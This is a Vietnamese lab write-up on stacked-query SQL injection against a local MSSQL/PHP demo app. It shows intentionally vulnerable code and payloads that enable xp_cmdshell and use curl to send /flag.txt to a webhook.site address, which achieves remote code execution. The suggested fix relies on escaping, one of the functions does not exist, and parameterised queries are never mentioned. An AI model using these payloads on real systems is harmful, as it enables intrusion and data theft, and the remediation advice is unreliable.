### Tìm hiểu về SQL Injection thông qua Stacked query, demo trên MSSQL

- Stacked Query là một kỹ thuật SQL injection trong đó người tấn công thêm một hoặc nhiều câu lệnh SQL vào sau câu lệnh SQL gốc, từ đó thực hiện nhiều hành động trong một lần thực thi.



# Link demo : https://github.com/l3mnt2010/task2_KCSC/tree/main/demo/stackQuery
# Cách khắc phục :

- Hoặc làm sạch đầu vào   $cleaned_username = sqlsrv_real_escape_string($conn, $name);
$cleaned_password = mysqli_real_escape_string($conn, $password);
- Và tìm hiểu các CVE của các phiên bản để tránh được lỗi này có thể xảy ra.


+ Bắt đầu vào với một giao diện như trên
![Alt text](./imageStackQuery/image.png)

- Đây là đoạn code bị dính lỗi

<?php
require_once "../config/connectMssql.php";

if (isset($_GET['name'])) {
    global $conn;
    $name = $_GET['name'];
    $tsql = "SELECT * FROM $name";

    $stmt = sqlsrv_query($conn, $tsql);
    if( $stmt === false )
    {
        echo "Lỗi truy vấn.</br>";
        die( print_r( sqlsrv_errors(), true));
    }

    if ($stmt) {
           while( $row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC) ){
            echo '
                <div class="mt-56 bg-white rounded shadow dark:bg-gray-700">
                    <div class="relative z-20 p-6 group">
                        <div class="relative block h-64 mb-4 -mt-56 overflow-hidden rounded -top-full ">
                            <img class="object-cover w-full h-full transition-all group-hover:scale-110"
                                
                                 
                        src="https://pplay.vn/media/catalog/product/cache/1/image/485x440/9df78eab33525d08d6e5fb8d27136e95/7/0/70222-1.jpg" alt="">
                            <div class="absolute flex flex-col top-4 right-4">
                                <!-- Wishlist and Cart buttons here -->
                            </div>
                        </div>
                        <a href="#">
                            <h2 class="mb-2 text-xl font-bold text-black dark:text-white">
                                ' . $row['name'] . '
                            </h2>
                        </a>
                        <p class="mb-3 text-lg font-bold text-blue-500 dark:text-blue-300 ">
                            <span>$' . $row['sale'] . '.00</span>
                            <span class="text-xs font-semibold text-gray-400 line-through ">$' . $row['price'] . '.00</span>
                        </p>
                        <div class="flex gap-1 text-orange-400">
               <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
                   class="bi bi-star-fill" viewBox="0 0 16 16">
                   <path
                       d="M3.612 15.443c-.386.198-.824-.149-.746-.592l.83-4.73L.173 6.765c-.329-.314-.158-.888.283-.95l4.898-.696L7.538.792c.197-.39.73-.39.927 0l2.184 4.327 4.898.696c.441.062.612.636.282.95l-3.522 3.356.83 4.73c.078.443-.36.79-.746.592L8 13.187l-4.389 2.256z" />
               </svg>
               <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
                   class="bi bi-star-fill" viewBox="0 0 16 16">
                   <path
                       d="M3.612 15.443c-.386.198-.824-.149-.746-.592l.83-4.73L.173 6.765c-.329-.314-.158-.888.283-.95l4.898-.696L7.538.792c.197-.39.73-.39.927 0l2.184 4.327 4.898.696c.441.062.612.636.282.95l-3.522 3.356.83 4.73c.078.443-.36.79-.746.592L8 13.187l-4.389 2.256z" />
               </svg>
               <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
                   class="bi bi-star-fill" viewBox="0 0 16 16">
                   <path
                       d="M3.612 15.443c-.386.198-.824-.149-.746-.592l.83-4.73L.173 6.765c-.329-.314-.158-.888.283-.95l4.898-.696L7.538.792c.197-.39.73-.39.927 0l2.184 4.327 4.898.696c.441.062.612.636.282.95l-3.522 3.356.83 4.73c.078.443-.36.79-.746.592L8 13.187l-4.389 2.256z" />
               </svg>
               <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
                   class="bi bi-star-fill" viewBox="0 0 16 16">
                   <path
                       d="M3.612 15.443c-.386.198-.824-.149-.746-.592l.83-4.73L.173 6.765c-.329-.314-.158-.888.283-.95l4.898-.696L7.538.792c.197-.39.73-.39.927 0l2.184 4.327 4.898.696c.441.062.612.636.282.95l-3.522 3.356.83 4.73c.078.443-.36.79-.746.592L8 13.187l-4.389 2.256z" />
               </svg>
               <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
                   class="bi bi-star" viewBox="0 0 16 16">
                   <path
                       d="M2.866 14.85c-.078.444.36.791.746.593l4.39-2.256 4.389 2.256c.386.198.824-.149.746-.592l-.83-4.73 3.522-3.356c.33-.314.16-.888-.282-.95l-4.898-.696L8.465.792a.513.513 0 0 0-.927 0L5.354 5.12l-4.898.696c-.441.062-.612.636-.283.95l3.523 3.356-.83 4.73zm4.905-2.767-3.686 1.894.694-3.957a.565.565 0 0 0-.163-.505L1.71 6.745l4.052-.576a.525.525 0 0 0 .393-.288L8 2.223l1.847 3.658a.525.525 0 0 0 .393.288l4.052.575-2.906 2.77a.565.565 0 0 0-.163.506l.694 3.957-3.686-1.894a.503.503 0 0 0-.461 0z" />
               </svg>
           </div>
                    </div>
                    
                </div>
            ';
        }
    } else {
        echo '<p class="font-bold text-center mt-48 text-xl">Invalid name or your hack me!!!</p>';
    }
    sqlsrv_free_stmt( $stmt);
    sqlsrv_close( $conn);
}
?>



<?php


//     $tsql = "SELECT sale FROM items; WAITFOR DELAY '0:0:10'";
    
//     $stmt = sqlsrv_query($conn, $tsql);
//     if( $stmt === false )
//     {
//         echo "Lỗi truy vấn.</br>";
//         die( print_r( sqlsrv_errors(), true));
//     }

//     $rows = [];
//     while( $row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC) )
//     {
//         $rows[] = $row;
//     }
//     print_r($rows);

//     sqlsrv_free_stmt( $stmt);
//     sqlsrv_close( $conn);
?>

- Có vẻ như là trang web này lấy giá trị param name và cho vào trong câu truy vấn
                                        $tsql = "SELECT * FROM $name";
- Bởi vì được truyền trực tiếp nên em có thể đoán là bị dính lỗi sql injection
- Em sẽ khai thác theo hướng thực thi shell trong MSSQL đây là một dạng stack query
- Vào trong burpsuite và chọn request bị dính lỗi như sau:
![Alt text](./imageStackQuery/image-1.png)

- Em thử thêm dấu ';' vào đằng sau và request vẫn thực hiện bình thường
![Alt text](./imageStackQuery/image-2.png)
- Sau đó em dùng payload "; WAITFOR DELAY '0:0:5'; -- "
- Em nhận lại được response sau 5s
![Alt text](./imageStackQuery/image-3.png)
- Điều này chứng tỏ là em có thể thực hiện chồng query ở trong trường hợp này
- Em muốn thực hiện được xp_cmdshell trong truy vấn để lấy dữ liệu
+ Ban đầu em sẽ phải cài đặt lại setting để có thể thực hiện shell

em tham khảo bài viết này:  https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e
Và dùng payload :  ";EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; WAITFOR DELAY '0:0:5'; --"

- Và em nhận được kết quả sau 5s  chứng tỏ là đã reconfig thành công
![Alt text](./imageStackQuery/image-4.png)

- Tiếp sau đó em thực thi shell curl đến webhook của em

 http://localhost/task2_KCSC/demo/stackQuery/index.php?name=items;EXEC%20xp_cmdshell%20%27curl+https://webhook.site/0e0a8778-5ef0-4657-8aec-84076f5a552e;%20WAITFOR%20DELAY%20%270:0:5%27;%20--%20%22

Và vào webhook em nhận được
![Alt text](./imageStackQuery/image-5.png)
- em tính revershell trên này mà để hôm sau em chuyển qua linux cho dễ ạ:v

Em dùng payload này để lấy thông tin file flag.txt
;EXEC%20xp_cmdshell%20%27curl+-X+POST+--data+"@/flag.txt"+-H+"Content-Type:+application/data"+https://webhook.site/0e0a8778-5ef0-4657-8aec-84076f5a552e%27;%20WAITFOR%20DELAY%20%270:0:5%27;%20--%20%22
![Alt text](./imageStackQuery/image-6.png)
Và kết quả:
![Alt text](./imageStackQuery/image-7.png)
Và em nhận được thông tin vậy là em đã RCE được sever @@